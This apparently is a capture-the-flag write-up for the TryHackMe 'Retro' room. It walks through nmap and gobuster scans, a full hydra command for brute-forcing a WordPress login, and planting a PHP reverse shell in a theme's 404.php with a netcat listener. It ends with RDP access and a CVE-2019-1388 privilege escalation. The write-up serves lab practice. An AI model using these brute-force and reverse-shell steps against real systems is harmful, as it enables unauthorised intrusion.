# Retro
[Play](https://tryhackme.com/room/retro)

## 1. Scanning & Enumeration
Let's start with the nmap scan and run gobuster in parallel, since the questions hint on it.

Looking at the website, it looks like a windows server.

### 1.1 Port Scanning
```
kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.96.15
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 21:46 EDT
Nmap scan report for 10.10.96.15
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2021-05-08T01:47:19+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2021-05-07T01:35:04
|_Not valid after:  2021-11-06T01:35:04
|_ssl-date: 2021-05-08T01:47:23+00:00; +2s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.64 seconds
```


Gobuster returned empty on the dirb common list. One other thing I want to try out is check for subdomains.

### 1.2 Sub-Domains
Using the command,

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo wfuzz -Z -c -f sub-fighter -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u 10.10.96.15 -H "Host: FUZZ.10.10.96.16" --hc 200,400
```


we found out ... nothing. So, anyways, I looked at the hint, and they said ... run it on dirbuster medium list.

### 1.3 Web Enumeration

So I found out one directory named retro. Should have tried it the first thing lmao. Anyways, since they mention "the" directory, I'll stop the scan and we'll see what it holds for us.

```
kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.96.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/07 22:09:35 Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 148] [--> http://10.10.96.15/retro/]
Progress: 13495 / 220561 (6.12%)                                              ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2021/05/07 22:16:22 Finished
===============================================================
```

![A screenshot of the WordPress Website](https://i.imgur.com/Cd3WvVT.png)

Okay. Looking around, we have a login page, which looks like its a wordpress website. Plus, we see that even the "Hello World" post in the start (at the bottom) is made by Wade. This means we can try bruteforcing wp-login using hydra. One another path could be uploading a reverse shell, since the first post has a link where we can upload stuff. However, it just redirects to an external website. We can come back to it if hydra does not work out.

![A screenshot of the login page, with Wade given as username](https://i.imgur.com/93vX86A.png)

Okay. Let's fire up burp, and using the intercept option, we have 

```
POST /retro/wp-login.php HTTP/1.1

...

log=Wade&pwd=brrr&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1
```

As the POST request. Also, we are on the right track - look at the error message!

![Correct username, showing error on password](https://i.imgur.com/uHZ4R3z.png)

Now we'll do Hydra goes brrr.

### 1.4 Bruteforcing
From https://github.com/gnebbia/hydra_notes, I found the following,
> hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp- login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
> # now we check for success by using S=Location, since wordpress uses a Location
> # header to redirect the user, we can think about S as a sort of grep applied to
> # the HTTP response


Our command thus becomes 
```
hydra -l Wade -P /usr/share/wordlists/rockyou.txt 10.10.96.15 http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:S=Location"
```

Okay so meanwhile, I had a look at the hint to see if I am on the right track. The hint mentions the presence of sensitive information. Is it just the username? or maybe, I can look at the posts while hydra attacks.

### 1.5 Web Exploration
Oh my god. LMAO.

Okok so, I was looking around, went to archives, nothing interesting. But, I clicked on Wade and looked at some other things, "Entries RSS", "Comments RSS" looked interesting. So, the Entries was too filled up so I looked at comments first.

And damn there was something off about the way the sentence is framed. Have a look:

![A screenshot of the RSS comments section page](https://i.imgur.com/jbF9PDd.png)

"Leaving myself a note here just in case I forget how to spell it: {password}"

Now, ofcourse, this could be about ready player one, whose protagonist is this guy - and the story matches too XD

So, I tried logging in - no harm right, Hydra already running. And then I see this:

![A screenshot of the WordPress Admin page](https://i.imgur.com/4ntp2fG.png)

Ey voila! Stopped Hydra. 

### 1.6 Rev-Shell Time (or maybe not)
We have some exploits for wordpress, in the 404 pages. Go to Appearance -> Theme Editor -> 404.php. We'll put a tasty reverse shell here and then go to an invalid page on the website - thus redirecting us to 404 and we are set.

Have a netcat listener setup on 1337 or a port of your choice: `nc -lvnp 1337`

Goto `https://www.revshells.com/` and get the `PHP PentestMonkey` code with your ip and port. Now, let's comment out the 404.php WP gave us, and put this code.

Go to `http://10.10.96.15/retro/index.php/yougongetpwned` 

...

"WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to 10.8.150.214:1337 ERROR: Shell process terminated"

Okay. Very interesting. I have never seen this shit before, so I looked it up: `https://www.reddit.com/r/oscp/comments/elh0ai/htb_bashed_failed_to_daemonise/` mentions how this may be a firewall issue. One redditor suggests using the port 443, so let's try that.

... same error.

I tried a bunch more common ports, but this wont budge. 


## 2. Restarting - Getting a Foothold
Note that we have another port 3389 having ms-wbt-server. Let's try going in using Remmina. We already have credentials.

![A screenshot of the Windows Server we logged in using Remmina](https://i.imgur.com/fpmQZPT.png)

Very nice. User flag in our hands now!

Doing some exploration we have, ![A screenshot of the Google Chrome new tab page](https://i.imgur.com/O0VfOJT.png)

Notice: the bookmark and the history. It refers to the link: https://nvd.nist.gov/vuln/detail/CVE-2019-1388

Doing some quick Google and YouTube search, [I found this YouTube video](https://www.youtube.com/watch?v=3BQKpPNlTSo).

## 3. Priviledge Escalation
Interestingly, we have another thing hidden here - check the Recycle Bin! The executable required to run this exploit is already present :)

![A screenshot of the Windows Server: Click on "Show Details"](https://i.imgur.com/MV8glyU.png)
Click on "Show Details"

![Click on certificate thing, open with browser](https://i.imgur.com/Rp9leKG.png)
Click on certificate thing, open with browser

![A screenshot of the Windows Server: Page not displayed](https://i.imgur.com/fBHEPQN.png)
"Page not displayed", this is a valid error since we do not have internet connection.

![A screenshot of the Windows Server: Save it using ctrl+s](https://i.imgur.com/7GrrZND.png)
Save it using ctrl+s, or using the steps shown.

![The error message](https://i.imgur.com/G0GPvAo.png)
If you see the error message, you are on the right track!

![Saving the web page](https://i.imgur.com/ZSvFkZI.png)
Save it using the name *.* in C:\\Windows\System32

![CMD as Admin](https://i.imgur.com/gzjHCUL.png)
🗿📈
